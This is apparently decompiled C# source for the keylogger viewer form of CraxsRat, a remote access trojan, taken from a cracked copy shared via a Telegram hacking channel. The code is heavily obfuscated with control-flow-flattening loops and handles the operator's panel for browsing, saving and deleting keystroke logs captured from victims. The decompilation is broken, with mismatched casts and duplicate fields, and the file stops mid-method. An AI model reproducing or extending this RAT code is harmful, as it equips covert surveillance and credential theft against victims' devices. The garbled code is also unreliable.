// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Keylogger
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Keylogger : Form
  {
    public Client Classclient;
    public string Title;
    public object firstclick;
    public Dictionary<string, string> MapData;
    private int y;
    public string \u0024VB\u0024Local_datastring;
    public WebViewMonitor \u0024VB\u0024Me;
    public string \u0024VB\u0024Local_lnk;
    public WebViewMonitor \u0024VB\u0024Me;
    public Label \u0024VB\u0024Local_newsitelabe;
    public WebViewMonitor._Closure\u0024__218\u002D0 \u0024VB\u0024NonLocal_\u0024VB\u0024Closure_2;
    public MemoryStream MS;
    private static long CountryBegin;
    public string[] CountryName;
    public string[] CountryCode;
    public string[] CountryNump;
    private IContainer components;
    public int id;
    private IContainer components;

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get => ((Microphone) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
        System.Windows.Forms.Timer topacity = ((Microphone) this)._TOpacity;
        if (topacity == null)
          goto label_5;
label_1:
        int num1 = 1373166692;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((673632258 - -56594015) * -196486931 - ~(num2 * 2008758915) * 1669208403)) % 5U)
          {
            case 0:
              goto label_3;
            case 1:
              topacity.Tick += eventHandler;
              num1 = (int) num3 * -1410268843 ^ 954000351;
              continue;
            case 2:
              goto label_5;
            case 3:
              topacity.Tick -= eventHandler;
              num1 = (int) num3 * -215876716 ^ -109126023;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:
        return;
label_5:
        ((Microphone) this)._TOpacity = value;
        topacity = ((Microphone) this)._TOpacity;
        num1 = topacity == null ? -59591065 : (num1 = 1901172088);
        goto label_2;
      }
    }

    internal virtual DataGridView DGV0
    {
      get => ((Microphone) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._DGV0 = value;
    }

    internal virtual ContextMenuStrip ctxMenu
    {
      get => ((Microphone) this)._ctxMenu;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._ctxMenu = value;
    }

    internal virtual ToolStripMenuItem SaveToolStripMenuItem
    {
      get => ((Microphone) this)._SaveToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveToolStripMenuItem_Click);
label_1:
        int num1 = 832964820;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-num1 - --150461385)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem = ((Microphone) this)._SaveToolStripMenuItem;
              num1 = (int) num2 * 1079915428 ^ 1948095289;
              continue;
            case 2:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 941149972 ^ -1764098570;
              continue;
            case 3:
              goto label_3;
            case 4:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 656011826 ^ 2146583610;
              continue;
            case 5:
              toolStripMenuItem = ((Microphone) this)._SaveToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? 1110777435 : (num3 = 1109708404);
              num1 = num3 ^ (int) num2 * 727784105;
              continue;
            case 6:
              int num4 = toolStripMenuItem == null ? 710978580 : (num4 = 268727837);
              num1 = num4 ^ (int) num2 * -803665359;
              continue;
            case 7:
              ((Microphone) this)._SaveToolStripMenuItem = value;
              num1 = -19850400;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
    {
      get => ((Microphone) this)._SaveAsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveAsToolStripMenuItem_Click);
label_1:
        int num1 = 1470856317;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 ^ -(-597854111 * (-670594668 ^ --274729915)) + ~(364366643 * -1337352955)) - (-491241287 ^ 77832004 + 7921881 - 423647212) - (-1693250063 - 604916204 + (1464879260 - 209451799)))) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem = ((Microphone) this)._SaveAsToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? -1729791890 : (num3 = -2090321113);
              num1 = num3 ^ (int) num2 * 554256402;
              continue;
            case 2:
              toolStripMenuItem = ((Microphone) this)._SaveAsToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -1449265050 : (num4 = 77981025);
              num1 = num4 ^ (int) num2 * -1464487372;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 1137421384 ^ 137354952;
              continue;
            case 4:
              goto label_3;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -420444276 ^ -1348887234;
              continue;
            case 6:
              ((Microphone) this)._SaveAsToolStripMenuItem = value;
              num1 = -1360145265;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIComboBox combologs
    {
      get => ((Microphone) this)._combologs;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._combologs = value;
    }

    internal virtual Button getbtn
    {
      get => ((Microphone) this)._getbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.getbtn_click);
label_1:
        int num1 = 447986507;
        Button getbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(num1 ^ -~(-2102013987 * 961286029 - (1735256511 - 791548471) - (--1313484651 - 1012928257))) ^ (1356441214 ^ ~1612936339) - ~(1180387901 * -631914653)) - ~(-416225655 * -1317891028) - --1811191038 + 1007232050)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              getbtn.Click += eventHandler;
              num1 = (int) num2 * 1148629209 ^ -2128041321;
              continue;
            case 2:
              int num3 = getbtn == null ? 1407527481 : (num3 = 890492227);
              num1 = num3 ^ (int) num2 * -1360335168;
              continue;
            case 3:
              goto label_3;
            case 4:
              ((Microphone) this)._getbtn = value;
              getbtn = ((Microphone) this)._getbtn;
              int num4;
              num1 = num4 = getbtn == null ? 360460000 : (num4 = 377800340);
              continue;
            case 5:
              getbtn = ((Microphone) this)._getbtn;
              num1 = (int) num2 * -1960693566 ^ 1842467728;
              continue;
            case 6:
              getbtn.Click -= eventHandler;
              num1 = (int) num2 * 1279620370 ^ 1043547833;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((Microphone) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._Panel1 = value;
    }

    internal virtual Button Button2
    {
      get => ((Microphone) this)._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
label_1:
        int num1 = 1017411832;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button button2;
          switch ((num3 = (uint) (693693798 - (~910056494 - (num2 ^ -197772709 * ~-1605678238)) * 352589585 - -2097402609)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = button2 == null ? -1012780701 : (num4 = -208560212);
              num1 = num4 ^ (int) num3 * 1506159887;
              continue;
            case 2:
              goto label_3;
            case 3:
              button2.Click -= eventHandler;
              num1 = (int) num3 * -1417360979 ^ 1205010506;
              continue;
            case 4:
              button2 = ((Microphone) this)._Button2;
              int num5 = button2 == null ? -1836451352 : (num5 = -1593957637);
              num1 = num5 ^ (int) num3 * -1340742376;
              continue;
            case 5:
              ((Microphone) this)._Button2 = value;
              button2 = ((Microphone) this)._Button2;
              num1 = -377276370;
              continue;
            case 6:
              button2.Click += eventHandler;
              num1 = (int) num3 * 315567720 ^ 1186466666;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUITabControl keytabs
    {
      get => ((Microphone) this)._keytabs;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._keytabs = value;
    }

    internal virtual TabPage TabPage3
    {
      get => ((Microphone) this)._TabPage3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._TabPage3 = value;
    }

    internal virtual TabPage TabPage4
    {
      get => ((Microphone) this)._TabPage4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._TabPage4 = value;
    }

    internal virtual DrakeUILoadingBar loadinglogs
    {
      get => ((Microphone) this)._loadinglogs;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._loadinglogs = value;
    }

    internal virtual Button savedbtn
    {
      get => ((Microphone) this)._savedbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click);
        Button savedbtn = ((Microphone) this)._savedbtn;
        if (savedbtn == null)
          goto label_5;
label_1:
        int num1 = -2098831326;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((--(num1 - (((-575385063 * 1916861109 ^ -549451075 * -745444113) - -1901309782 ^ 1556914334) - (-(-1308729500 - 96701691 + -1073000577) ^ (~244637150 ^ --518190473) + (~2101274264 ^ -412706613 ^ -15523844)))) ^ -31637333 * (144076823 ^ -707975740)) - (-788345258 - -1683504342))) % 7U)
          {
            case 0:
              savedbtn = ((Microphone) this)._savedbtn;
              num1 = (int) num2 * 1260693907 ^ -2038171275;
              continue;
            case 1:
              savedbtn.Click -= eventHandler;
              num1 = (int) num2 * -778161789 ^ -1259456976;
              continue;
            case 2:
              int num3 = savedbtn == null ? -548146143 : (num3 = -792449268);
              num1 = num3 ^ (int) num2 * -345780300;
              continue;
            case 3:
              savedbtn.Click += eventHandler;
              num1 = (int) num2 * -1707441197 ^ -680998071;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            case 6:
              goto label_5;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        ((Microphone) this)._savedbtn = value;
        num1 = 920229955;
        goto label_2;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((Microphone) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._Column1 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((Microphone) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._Column6 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column3
    {
      get => ((Microphone) this)._Column3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._Column3 = value;
    }

    internal virtual DataGridViewImageColumn Column2
    {
      get => ((Microphone) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._Column2 = value;
    }

    internal virtual Button delbtn
    {
      get => ((Microphone) this)._delbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Delbtn_Click);
label_1:
        int num1 = -1729854348;
        Button delbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (--~(~num1 - (666541795 + --272292793 * 445445851 - 991584907)) ^ -1384498690)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              delbtn = ((Microphone) this)._delbtn;
              int num3 = delbtn == null ? 169068146 : (num3 = 619902009);
              num1 = num3 ^ (int) num2 * -229495610;
              continue;
            case 2:
              goto label_1;
            case 3:
              ((Microphone) this)._delbtn = value;
              num1 = 1296592257;
              continue;
            case 4:
              delbtn = ((Microphone) this)._delbtn;
              int num4 = delbtn == null ? -1649421088 : (num4 = 1111208073);
              num1 = num4 ^ (int) num2 * -1806860975;
              continue;
            case 5:
              delbtn.Click -= eventHandler;
              num1 = (int) num2 * 1387484395 ^ -1655617096;
              continue;
            case 6:
              delbtn.Click += eventHandler;
              num1 = (int) num2 * -1141900528 ^ 48092898;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button deleteallbtn
    {
      get => ((Microphone) this)._deleteallbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click_1);
label_1:
        int num1 = 1302358384;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button deleteallbtn;
          switch ((num3 = (uint) ((-(-(~-526183620 + 632207045 * (-573249697 * -871361703)) - ((1474877204 - -709754961) * -1806464387 - (-310509680 - 51966133) ^ -(-936572971 - -1543220321) - ---1093598710) - num2) - 1851321718 - ~~-1802384949 ^ -879267756 - -1340587697) - 1804709541)) % 6U)
          {
            case 0:
              deleteallbtn.Click += eventHandler;
              num1 = (int) num3 * 642258429 ^ 1479448840;
              continue;
            case 1:
              deleteallbtn = ((Microphone) this)._deleteallbtn;
              int num4 = deleteallbtn == null ? 1123511803 : (num4 = 103302120);
              num1 = num4 ^ (int) num3 * -59512961;
              continue;
            case 2:
              deleteallbtn.Click -= eventHandler;
              num1 = (int) num3 * -1162699841 ^ -1140520086;
              continue;
            case 3:
              ((Microphone) this)._deleteallbtn = value;
              deleteallbtn = ((Microphone) this)._deleteallbtn;
              int num5;
              num1 = num5 = deleteallbtn == null ? 590190770 : (num5 = 801938375);
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Button backallbtn
    {
      get => ((Microphone) this)._backallbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Backallbtn_Click);
        Button backallbtn = ((Microphone) this)._backallbtn;
label_1:
        int num1 = -1186524636;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((~num1 * -310085099 - -~~-521268012 - -314864170) * -161463681)) % 6U)
          {
            case 0:
              ((Microphone) this)._backallbtn = value;
              backallbtn = ((Microphone) this)._backallbtn;
              int num3;
              num1 = num3 = backallbtn == null ? 1780211940 : (num3 = 2041009257);
              continue;
            case 1:
              backallbtn.Click += eventHandler;
              num1 = (int) num2 * -1768841759 ^ -1505593329;
              continue;
            case 2:
              int num4 = backallbtn == null ? 561300424 : (num4 = 2032308525);
              num1 = num4 ^ (int) num2 * -1325329834;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              backallbtn.Click -= eventHandler;
              num1 = (int) num2 * 892069891 ^ -579490179;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((Microphone) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._Panel2 = value;
    }

    internal virtual PictureBox ClientPic
    {
      get => ((Microphone) this)._ClientPic;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._ClientPic = value;
    }

    internal virtual Label clinameinfo
    {
      get => ((Microphone) this)._clinameinfo;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._clinameinfo = value;
    }

    internal virtual Panel Panel3
    {
      get => ((Microphone) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._Panel3 = value;
    }

    internal virtual DrakeUIAvatar clearsrchbtn
    {
      get => ((Microphone) this)._clearsrchbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Clearsrchbtn_Click);
        DrakeUIAvatar clearsrchbtn = ((Microphone) this)._clearsrchbtn;
        if (clearsrchbtn == null)
          goto label_7;
label_1:
        int num1 = 1379873861;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 + ((-687328798 ^ 2129520779) + (-1877519454 - -99999700) - 763368469 + ~~(1737240360 - 475579252) + (--128024555 - (1687531971 - 333317624) - (-633797536 - -408417832 + ~-278783606) + -(1044525741 - 1677907561 + (-346673038 ^ -952079304))))) * -1316499237 - (~983183954 - -645880183 * -1366566753 + (32728200 + 1302572014) * -584834685) - -(-1041784167 - 1436092709) - 1218432275 * -258004182 ^ 571329712)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              clearsrchbtn.Click -= eventHandler;
              num1 = (int) num2 * -398255852 ^ 1358594905;
              continue;
            case 2:
              goto label_7;
            case 3:
              clearsrchbtn = ((Microphone) this)._clearsrchbtn;
              num1 = (int) num2 * 73448316 ^ 1277718384;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num3 = clearsrchbtn == null ? 1317832204 : (num3 = 39271468);
              num1 = num3 ^ (int) num2 * -1697306002;
              continue;
            case 6:
              clearsrchbtn.Click += eventHandler;
              num1 = (int) num2 * 306604633 ^ -351812049;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_7:
        ((Microphone) this)._clearsrchbtn = value;
        num1 = 1457586807;
        goto label_2;
      }
    }

    internal virtual DrakeUITextBox searchtext
    {
      get => ((Microphone) this)._searchtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Searchtext_TextChanged);
label_1:
        int num1 = -683573309;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUITextBox searchtext;
          switch ((num3 = (uint) (-740202858 - -(-~~num2 * 1057063809))) % 9U)
          {
            case 0:
              ((Microphone) this)._searchtext = value;
              num1 = 1840908422;
              continue;
            case 1:
              searchtext = ((Microphone) this)._searchtext;
              num1 = (int) num3 * 422370899 ^ -702106790;
              continue;
            case 2:
              goto label_3;
            case 3:
              searchtext.TextChanged += eventHandler;
              num1 = (int) num3 * -1352242397 ^ 838030175;
              continue;
            case 4:
              goto label_1;
            case 5:
              searchtext.TextChanged -= eventHandler;
              num1 = (int) num3 * 776639215 ^ -1647577105;
              continue;
            case 6:
              int num4 = searchtext == null ? -1056308882 : (num4 = -58262917);
              num1 = num4 ^ (int) num3 * -1264685131;
              continue;
            case 7:
              searchtext = ((Microphone) this)._searchtext;
              num1 = (int) num3 * 1788743753 ^ 1955755814;
              continue;
            case 8:
              int num5 = searchtext == null ? -2047222448 : (num5 = 1273134137);
              num1 = num5 ^ (int) num3 * 828608770;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIAvatar searchbtn
    {
      get => ((Microphone) this)._searchbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Searchbtn_Click);
        DrakeUIAvatar searchbtn = ((Microphone) this)._searchbtn;
label_1:
        int num1 = -639847212;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 - ~(1439139291 * (1239386737 * (-1795169728 ^ -1573354123)) + 1414139765 * (-257135309 * 125547209)) + (-(-1263045364 * -1174141467 - --1961073037) + 11686378)) - (550648065 - 893523577 - (-1131917493 - 224245422)))) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              searchbtn.Click += eventHandler;
              num1 = (int) num2 * -1575435717 ^ 699097168;
              continue;
            case 2:
              searchbtn.Click -= eventHandler;
              num1 = (int) num2 * 559358482 ^ 1577936610;
              continue;
            case 3:
              searchbtn = ((Microphone) this)._searchbtn;
              int num3 = searchbtn == null ? 981058482 : (num3 = 119831077);
              num1 = num3 ^ (int) num2 * 1639036400;
              continue;
            case 4:
              int num4 = searchbtn == null ? -659524477 : (num4 = 353102446);
              num1 = num4 ^ (int) num2 * -42315137;
              continue;
            case 5:
              ((Microphone) this)._searchbtn = value;
              num1 = -927326396;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual RichTextBox offlinetext
    {
      get => ((Microphone) this)._offlinetext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._offlinetext = value;
    }

    internal virtual DrakeUIButtonIcon exitbtn
    {
      get => ((Microphone) this)._exitbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Exitbtn_Click);
        DrakeUIButtonIcon exitbtn = ((Microphone) this)._exitbtn;
        if (exitbtn == null)
          goto label_6;
label_1:
        int num1 = -963309252;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 - (~--761315714 + (-1111803217 - -1041572527 * 2043986689) + ((-720020964 + (-26529494 - 1025417913) ^ 776027383 - (-102167923 ^ -1844998633)) - -(~-178610622 - -1414560653))) ^ --711612968 * -538919271 ^ -(--1198416416 + -2000819579 * -1549462247)) - (1594485385 - 1224857637) * 1403037059 - (-919940886 - 2104813076)) * -349023215)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_6;
            case 2:
              exitbtn.Click += eventHandler;
              num1 = (int) num2 * 590587419 ^ 1421009705;
              continue;
            case 3:
              goto label_3;
            case 4:
              exitbtn.Click -= eventHandler;
              num1 = (int) num2 * -1087565035 ^ 1374575829;
              continue;
            case 5:
              int num3 = exitbtn == null ? 883068935 : (num3 = -1889624132);
              num1 = num3 ^ (int) num2 * -529503528;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_6:
        ((Microphone) this)._exitbtn = value;
        exitbtn = ((Microphone) this)._exitbtn;
        num1 = 2104969505;
        goto label_2;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((Microphone) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
        DrakeUIButtonIcon drakeUiButtonIcon1 = ((Microphone) this)._DrakeUIButtonIcon1;
label_1:
        int num1 = 15213533;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (((~(-2138931541 * -755066825) ^ -1599395157 ^ -457590720 ^ ~1229981549) - (num2 - (~((608262758 ^ -1588202477) + (423142157 - 849964271)) - ~~(-129154543 - -1055563546) ^ -670738161 * ((1418762028 - 2118189358 - (156943850 ^ 1079503280)) * 2002650133)) + (1185595656 - -1136486345 * (824395238 ^ -2116167711 * 958429894))) ^ (-1784620308 ^ -86781799) - (544688172 + 1470729357)) - ~1620449125 ^ -1033859814)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              int num4 = drakeUiButtonIcon1 == null ? -332960890 : (num4 = -1859499031);
              num1 = num4 ^ (int) num3 * 173123795;
              continue;
            case 2:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num3 * -1806179120 ^ 1001601195;
              continue;
            case 3:
              ((Microphone) this)._DrakeUIButtonIcon1 = value;
              drakeUiButtonIcon1 = ((Microphone) this)._DrakeUIButtonIcon1;
              int num5;
              num1 = num5 = drakeUiButtonIcon1 == null ? -555050190 : (num5 = -796834071);
              continue;
            case 4:
              goto label_1;
            case 5:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num3 * -729963368 ^ -1149287750;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public void CraxsStyle()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = 1721272540;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-650165749 ^ 1653299561) - (~-num2 * 207184701 - (-1964348758 - 703194012 ^ -289742839)) ^ 1708981835)) % 15U)
        {
          case 0:
            this.keytabs.TabPages[1].Text = EXGuarder.\u003361B1D35;
            num1 = (int) num3 * -639631703 ^ -1415367603;
            continue;
          case 1:
            int num4 = Operators.CompareString(language, EXGuarder.\u00362571D26, false) == 0 ? 19760267 : (num4 = 1232994674);
            num1 = num4 ^ (int) num3 * 435029594;
            continue;
          case 2:
            this.delbtn.Text = EXGuarder.\u003434C483D;
            num1 = (int) num3 * -1432112107 ^ -253577561;
            continue;
          case 3:
            int num5 = Operators.CompareString(language, EXGuarder.\u00363060B36, false) != 0 ? -2054331524 : (num5 = 294671860);
            num1 = num5 ^ (int) num3 * 2108638652;
            continue;
          case 4:
            this.delbtn.Text = EXGuarder.\u0030D2F0025;
            num1 = (int) num3 * 368403812 ^ -387232738;
            continue;
          case 5:
            this.savedbtn.Text = EXGuarder.\u00309572F3A;
            this.backallbtn.Text = EXGuarder.\u003556D7249;
            num1 = (int) num3 * 692324812 ^ -1590029401;
            continue;
          case 6:
            this.deleteallbtn.Text = EXGuarder.\u003143B4319;
            num1 = (int) num3 * -1675379622 ^ 1482247654;
            continue;
          case 7:
            this.keytabs.TabPages[0].Text = EXGuarder.\u0035777244D;
            this.keytabs.TabPages[1].Text = EXGuarder.\u0030A0F5074;
            num1 = (int) num3 * -1961972310 ^ 645897454;
            continue;
          case 8:
            goto label_3;
          case 9:
            this.getbtn.Text = EXGuarder.\u003536C3D08;
            num1 = -1767997372;
            continue;
          case 10:
            this.getbtn.Text = EXGuarder.\u00365424025;
            num1 = (int) num3 * 1345120283 ^ -688253966;
            continue;
          case 11:
            this.deleteallbtn.Text = EXGuarder.\u0035C603D0D;
            this.keytabs.TabPages[0].Text = EXGuarder.\u00340224268;
            num1 = (int) num3 * 534829240 ^ 1536437728;
            continue;
          case 12:
            this.savedbtn.Text = EXGuarder.\u003471A0E6A;
            num1 = (int) num3 * -2107681197 ^ -722415967;
            continue;
          case 13:
            this.backallbtn.Text = EXGuarder.\u0037045062D;
            num1 = (int) num3 * -968050150 ^ 1319764312;
            continue;
          case 14:
            goto label_1;
          default:
            goto label_17;
        }
      }
label_3:
      return;
label_17:;
    }

    public Keylogger()
    {
label_1:
      int num1 = -1478118405;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-(num1 ^ -(-(204626961 - -391506509 * 1000400700) * -1084891383)) ^ 762883531 * (-1658286087 ^ 1088319295) - 1499508359) - 1886006047 * 923975147 ^ -156293805 * -97818732 ^ 1895958556)) % 8U)
        {
          case 0:
            this.Font = Settings.f;
            num1 = (int) num2 * 692642439 ^ -867341730;
            continue;
          case 1:
            this.CraxsStyle();
            num1 = (int) num2 * 538872676 ^ 1273997840;
            continue;
          case 2:
            this.combologs = new DrakeUIComboBox();
            num1 = (int) num2 * 394755077 ^ 1681869040;
            continue;
          case 3:
            goto label_1;
          case 4:
            this.Load += new EventHandler(this.Keylogger_Load);
            this.Closing += new CancelEventHandler(this.Keylogger_Closing);
            num1 = (int) num2 * 1407569544 ^ -326018103;
            continue;
          case 5:
            ((Ports) this).Title = EXGuarder.\u0030C5C1F16;
            ((Ports) this).IsActive = false;
            num1 = (int) num2 * -1821910442 ^ 273501067;
            continue;
          case 6:
            ((Ports) this).searchbefore = new List<DataGridViewRow>();
            ((Ports) this).lastFoundIndex = -1;
            ((inp) this).InitializeComponent();
            num1 = (int) num2 * 829357326 ^ -590822725;
            continue;
          case 7:
            goto label_3;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:;
    }

    private void SpyStyle()
    {
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = -304961194;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 ^ ~(-(-728860334 ^ -366864724) ^ -1260279196 * -1334818035) * -1756498281) + (1852295753 * (-2134562425 - ~-862850775) ^ 1849092113) ^ -(1622571642 ^ -1341010080))) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            goto label_3;
          case 3:
            this.Opacity += 0.1;
            num1 = (int) num2 * 1088284152 ^ 1848040243;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = 2032037115;
      goto label_2;
    }

    private void Keylogger_Load(object sender, EventArgs e)
    {
      this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
label_1:
      int num1 = 366989056;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~---~num1) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            this.DGV0.DefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * 1461460656 ^ 466512050;
            continue;
          case 3:
            this.DGV0.ContextMenuStrip = this.ctxMenu;
            num1 = (int) num2 * -132713189 ^ -1467948520;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0033B44740B);
      try
      {
        // ISSUE: reference to a compiler-generated field
        this.ClientPic.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((Microphone) this).classClient).Wallpaper;
label_7:
        int num3 = 1836139914;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) ~~---~num3) % 3U)
          {
            case 0:
              goto label_7;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
